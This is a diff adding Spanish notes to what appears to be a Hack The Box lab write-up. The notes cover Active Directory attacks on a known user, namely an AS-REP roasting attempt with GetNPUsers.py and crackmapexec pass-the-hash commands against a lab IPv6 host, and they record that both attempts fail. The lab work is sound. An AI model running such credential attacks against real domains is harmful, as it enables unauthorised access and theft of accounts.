@@ -163,8 +163,38 @@ cat hashes | grep " lo que sea " | sponge hashes # este si hace la operacion rem
 ```
 
 
+# Usuario valido
 
+Una vez que tienes un usuario valido puedes pensar en relizar deiversos ataques Ataque AS-REP Roast:
 
+```
+ henry.vinson@htb.local
+ 
+ GetNPUsers.py
+ 
+```
+ Se va a intentar solicitar un ticket TGT La idea e que cuando tu dispones de usuarios validos sin tener el pass para que en base a 
+ ciertas circunstancias puedas obtener el hash
+ 
+ ```
+ python3 GetNPUsers.py htb.local/ -no-pass -usersfile ~/APT/content/valid_users.txt
+ [-] User henry.vinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+ ```
+ 
+ Osea si esto hubiera funcionada obteniamos el TGT y de ahi pudieramos haber obtenido un password.
+ 
+ ## Checar si el hash es valido para el usuario
+ 
+```
+ crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H 'hkajkjkasdkfsa'
+ crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H lista_hashes.txt
+```
+ Aunque tambien se puede checar todos los hashes que obtuvimos pero la maquina nos bloquea todo esto sin exito.
+ 
+ ```
+ 
+ ```
 
 
 
